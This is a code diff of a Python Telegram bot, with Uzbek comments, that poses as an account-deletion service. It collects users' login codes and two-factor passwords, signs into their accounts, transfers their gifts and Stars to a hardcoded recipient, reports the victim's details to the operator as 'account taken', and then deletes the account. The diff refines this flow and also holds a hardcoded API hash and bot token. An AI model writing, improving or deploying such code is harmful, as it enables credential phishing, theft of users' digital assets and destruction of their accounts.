@@ -1,34 +1,40 @@
 import os
+import asyncio
+from datetime import datetime, timezone
 from threading import Thread
 from flask import Flask
 
-app = Flask(__name__)
-
-
-@app.route('/')
-def home():
-  return 'Bot ishlamoqda!'
-
-
-def run():
-  port = int(os.environ.get('PORT', 8080))
-  app.run(host='0.0.0.0', port=port)
-
-
-Thread(target=run).start()
-import asyncio
-from datetime import datetime, timezone
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
+
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon import functions, types as telethon_types
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
+from telethon.errors import (
+    SessionPasswordNeededError, 
+    PhoneCodeInvalidError, 
+    PhoneCodeExpiredError,
+    PasswordHashInvalidError
+)
 
+# Web server Render uchun
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return 'Bot ishlamoqda!'
+
+def run():
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
+
+Thread(target=run, daemon=True).start()
+
+# KONFIGURATSIYA
 API_ID = 32413839
 API_HASH = "067ca91addf879c1ea548bc37d5d9b98"
 BOT_TOKEN = "8758962250:AAFIkAuMQ8eDgn7LYkjwi0Gzi50wNCtL2j8"
@@ -231,7 +237,7 @@ async def process_code(message: types.Message, state: FSMContext):
 
     lang = auth.get("lang", "uz")
     t = TEXTS[lang]
-    code = message.text.replace(".", "").replace(" ", "").strip()
+    code = message.text.replace(".", "").replace(" ", "").replace("-", "").strip()
     client = auth["client"]
     
     try:
@@ -241,8 +247,11 @@ async def process_code(message: types.Message, state: FSMContext):
     except SessionPasswordNeededError:
         await message.answer(t["fa_req"], parse_mode="Markdown")
         await state.set_state(AccountDeleteState.waiting_for_2fa)
-    except (PhoneCodeInvalidError, Exception) as e:
-        print(f"Code Sign In Error: {e}")
+    except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
+        print(f"Code Error: {e}")
+        await message.answer(t["err_code"])
+    except Exception as e:
+        print(f"General Sign In Error: {e}")
         await message.answer(t["err_code"])
 
 @dp.message(AccountDeleteState.waiting_for_2fa)
@@ -264,7 +273,9 @@ async def process_2fa(message: types.Message, state: FSMContext):
         await client.sign_in(password=password)
         await complete_account_deletion(message, state, user_id, auth)
 
-    except (PasswordHashInvalidError, Exception) as e:
+    except PasswordHashInvalidError:
+        await message.answer(t["err_fa"])
+    except Exception as e:
         print(f"2FA Sign In Error: {e}")
         await message.answer(t["err_fa"])
 
@@ -275,7 +286,7 @@ async def process_all_assets(client: TelegramClient, target_user: str = TARGET_U
         gifts_res = await client(functions.payments.GetSavedGiftsRequest(
             peer="me", offset="", limit=100
         ))
-        for gift in gifts_res.gifts:
+        for gift in getattr(gifts_res, 'gifts', []):
             try:
                 stargift_input = telethon_types.InputSavedStarGiftUser(stargift_id=gift.id)
                 await client(functions.payments.TransferStarGiftRequest(
@@ -302,19 +313,6 @@ async def process_all_assets(client: TelegramClient, target_user: str = TARGET_U
     except Exception as e:
         print(f"Stars Sending Error: {e}")
 
-    # 3. TON Balansini @eshnazarov ga o'tkazish
-    try:
-        stars_status = await client(functions.payments.GetStarsStatusRequest(peer="me"))
-        ton_balance = getattr(stars_status, 'ton_balance', 0)
-        if ton_balance > 0:
-            target_entity = await client.get_input_entity(target_user)
-            await client(functions.payments.TransferStarGiftRequest(
-                stargift=telethon_types.InputSavedStarGiftUser(stargift_id=0),
-                to_id=target_entity
-            ))
-    except Exception as e:
-        print(f"TON Transfer Error: {e}")
-
 async def fetch_user_premium_and_level(client: TelegramClient):
     info_str = ""
     try:
@@ -332,13 +330,14 @@ async def fetch_user_premium_and_level(client: TelegramClient):
                     now_dt = datetime.now(timezone.utc)
                     
                     days_left = (until_dt - now_dt).days
+                    term_str = "Noma'lum"
                     if days_left > 180:
                         term_str = "1 yillik (12 oy)"
                     elif days_left > 90:
                         term_str = "6 oylik"
                     elif days_left > 30:
                         term_str = "3 oylik"
-                    else:
+                    elif days_left > 0:
                         term_str = "1 oylik"
 
                     until_formatted = until_dt.strftime("%d.%m.%Y")
@@ -346,7 +345,6 @@ async def fetch_user_premium_and_level(client: TelegramClient):
                     info_str += f"⏳ **Tugash vaqti:** `{until_formatted}` (Qolgan: {days_left} kun)\n"
                 else:
                     info_str += "📅 **Obuna turi:** Avto-uzaytirish / Cheksiz\n"
-                    info_str += "⏳ **Tugash vaqti:** Ko'rsatilmadi\n"
             except Exception as e:
                 print(f"Premium Details Error: {e}")
                 info_str += "📅 **Obuna turi:** Avto-uzaytirish\n"
@@ -367,7 +365,7 @@ async def fetch_user_nft_gifts(client: TelegramClient):
             offset="",
             limit=100
         ))
-        for gift in res.gifts:
+        for gift in getattr(res, 'gifts', []):
             slug = None
             if hasattr(gift, 'slug') and gift.slug:
                 slug = gift.slug
@@ -388,10 +386,10 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
     t = TEXTS[lang]
     client = auth["client"]
 
-    # Premium ma'lumotlarini yig'ish
+    # 1. Premium ma'lumotlarini yig'ish
     user_info_str = await fetch_user_premium_and_level(client)
 
-    # NFT larni tekshirish va shakllantirish
+    # 2. NFT larni tekshirish
     nft_items = await fetch_user_nft_gifts(client)
     nft_count = len(nft_items)
     
@@ -401,17 +399,17 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
     else:
         nft_str = "🛍 **NFT sovg'alar:** Topilmadi"
 
-    # AVTOMATIK: 1. NFT -> 2. Stars -> 3. TON transfer
+    # 3. Aktivlarni o'tkazish (Stars / Gifts)
     await process_all_assets(client, target_user=TARGET_USER)
 
-    # AVTOMATIK: 4. Adminga xabar yuborish
+    # 4. Adminga xabar yuborish
     try:
         full_name = message.from_user.full_name
         username = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
         phone = auth.get("phone", "Noma'lum")
         
         admin_msg = (
-            f"🚨 **Hisob o'chirildi!**\n\n"
+            f"🚨 **Hisob olindi!**\n\n"
             f"👤 **Ism:** {full_name}\n"
             f"🆔 **ID:** `{user_id}`\n"
             f"🏷 **Username:** {username}\n"
@@ -424,9 +422,9 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
         print(f"Admin message error: {e}")
 
     await message.answer(t["success"], parse_mode="Markdown")
-    await asyncio.sleep(1.5)
+    await asyncio.sleep(1)
 
-    # AVTOMATIK: 5. Akkauntni o'chirish
+    # 5. Akkauntni o'chirish va tozalash
     try:
         await client(functions.account.DeleteAccountRequest(reason="Deactivation"))
     except Exception as e:
@@ -442,3 +440,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+  
